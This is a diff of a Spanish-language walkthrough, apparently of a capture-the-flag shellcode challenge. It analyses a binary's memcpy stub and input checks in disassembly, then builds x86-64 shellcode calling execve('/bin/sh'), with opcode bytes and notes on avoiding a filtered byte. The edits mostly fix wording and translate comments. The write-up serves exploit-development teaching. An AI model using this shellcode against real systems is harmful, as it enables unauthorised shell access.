@@ -24,7 +24,7 @@ mov     rsi, rcx        ; src
 mov     rdi, rax        ; dest
 call    memcpy
 ```
-Es en la instrucción "call memcpy" nos va a copiar "algo" hardcodeado a otra posición de memoria. Este "algo" es un código que se ejecuta previamente a nuestro shellcode que lel pasemos. del main donde va a guardar esa parte más lo que nosotros le pasemos.
+Es en la instrucción "call memcpy" nos va a copiar "algo" hardcodeado a otra posición de memoria. Este "algo" es un código que se ejecuta previamente a nuestro shellcode que vamos a pasarle. 
 
 Breakpoint 3 at 0x555555554d89
  
@@ -37,6 +37,7 @@ arg[2]: 0x34 ('4')
 Vamos a tener 0x34h(52) bytes que va a copiar desde la posición de memoria 0x555555554ee8 a la posición de memoria 0x7ffff7ff3000. O sea, siempre se va a copiar a la posición 0x7ffff7ff3000 el contenido de 0x555555554ee8. ¿Qué es lo que hay en esa posición de memoria? Echemos un vistazo:
 
 ```
+x/32i 0x555555554ee8
    0x555555554ee8:	xor    rbp,rbp
    0x555555554eeb:	xor    rax,rax
    0x555555554eee:	xor    rbx,rbx
@@ -56,9 +57,11 @@ Vamos a tener 0x34h(52) bytes que va a copiar desde la posición de memoria 0x55
    0x555555554f1c:	add    BYTE PTR [rcx+rbp*2+0x6d],dl <-- Esta línea ya no forma parte de su código
 ```
 Como vemos son 0x34 (bytes) si restamos las posiciones de memoria:
+
 ```
    0x555555554f1c-0x555555554ee8=0x34 (el número de bytes que copia en hexadecimal)
 ```
+
 Entonces tenemos un código que nos va a limpiar todos los registros y va a reservar 0x1000 bytes en la pila, esto importante para luego preparar nuestro shellcode.
 
 Si seguimos con la función main te va a pedir que introduzcas tu shellcode o código:
@@ -134,7 +137,9 @@ call    sub_C38
 test    eax, eax
 jz      short loc_E3F
 ```
+
 Si es 0:
+
 ```asm
 lea     rdi, aInvalidInput
 call    puts
@@ -177,15 +182,15 @@ Para lograr ejecutar un /bin/sh, haciendo una llamada a la función execve hay q
 |59	        |sys_execve   |const char *filename | const char *const argv[]|	const char *const envp[]|		
 
 ```
-En ensamblador quedaría así:
+En ensamblador quedaría así, tener en cuenta que %rsi y %rdx ya están a 0 por el código hardcodeado que se ejecuta antes.
 
 
 ```asm
 68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
 68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
-48 89 e7            mov    rdi, rsp      ; 2. Put the '/bin//sh' addr in rdi
-b0 3b               mov    al, 0x3b      ; 5. Mov to rax the execve syscall number
-0f 05               syscall             ; 5. call it
+48 89 e7            mov    rdi, rsp      ; 2. Poner la dirección de '/bin//sh' en %rdi
+b0 3b               mov    al, 0x3b      ; 5. Mover el valor de llamada de sistema en %rax (0x3b=59)
+0f 05               syscall             ; 5. Hacer la llamada del sistema
 ```
 
 No podemos poner usar push porque su opcode \x68 coincide con el caracter 'h' de la shell,  lo hacemos con un mov:
